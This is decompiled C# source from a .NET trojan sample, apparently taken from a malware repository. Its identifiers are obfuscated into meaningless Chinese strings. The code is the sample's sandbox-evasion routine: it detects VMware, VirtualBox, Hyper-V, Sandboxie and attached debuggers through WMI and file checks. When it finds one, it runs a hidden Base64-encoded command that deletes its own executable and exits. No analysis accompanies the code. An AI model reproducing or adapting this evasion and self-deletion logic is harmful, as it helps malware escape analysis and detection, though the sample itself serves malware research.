// Decompiled with JetBrains decompiler
// Type: 法顧接生的澤官她的人的的望接.太的玉望玉澤望
// Assembly: 金是人望承子的的是公公的金司的程尊承顧, Version=1.8.7.7, Culture=neutral, PublicKeyToken=null
// MVID: E30F5A4F-F1E8-458D-9542-0A3A79B19682
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-21b86512de83574c3ad44210d025e93fb28d205cfbd18825da0a64a52063b627.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using 成官執望是導;
using 金席行商她;

namespace 法顧接生的澤官她的人的的望接
{
  public class 太的玉望玉澤望
  {
    [DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
    public static extern bool 導太接繼望希敬希的(string 顧孫將的顧為成玉希公的孫公);

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void 太的太孫管商導的孫()
    {
      try
      {
        if (!太的玉望玉澤望.承是的承尊的() && !的公的人官導官太命程.導是望管澤生().ToString().ToLower().Contains("XP".ToLower()) && !太的玉望玉澤望.導太接繼望希敬希的("SbieDll.dll") && !Debugger.IsLogging() && !Debugger.IsAttached && !File.Exists(Environment.GetEnvironmentVariable("windir") + "\\vboxhook.dll"))
          return;
        Interaction.Shell(命澤成的敬太.澤成將希商使金成是承的承成(Convert.FromBase64String("Y21kLmV4ZSAvYyBwaW5nIDAgLW4gMiAmIGRlbCA=")) + "\"" + Application.ExecutablePath + "\"", AppWinStyle.Hide);
        ProjectData.EndApp();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static bool 承是的承尊的()
    {
      bool flag;
      try
      {
        using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
          using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
          {
            try
            {
              foreach (ManagementBaseObject managementBaseObject in objectCollection)
              {
                string lower = managementBaseObject["Manufacturer"].ToString().ToLower();
                if (Operators.CompareString(lower, "microsoft corporation", false) == 0 && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL") || lower.Contains("vmware") || Operators.CompareString(managementBaseObject["Model"].ToString(), "VirtualBox", false) == 0)
                {
                  flag = true;
                  goto label_17;
                }
              }
            }
            finally
            {
              ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
              objectEnumerator?.Dispose();
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      flag = false;
label_17:
      return flag;
    }
  }
}
